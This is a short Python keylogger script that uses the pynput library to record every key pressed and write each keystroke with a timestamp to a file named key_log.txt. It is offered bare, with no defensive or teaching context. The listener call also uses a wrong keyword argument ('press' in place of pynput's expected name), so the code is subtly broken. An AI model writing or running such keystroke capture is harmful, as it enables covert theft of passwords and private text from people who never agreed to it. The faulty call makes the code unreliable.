from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename=("key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def press(but):
    logging.info(str(but))
with Listener(press=press) as listener:
    listener.join()
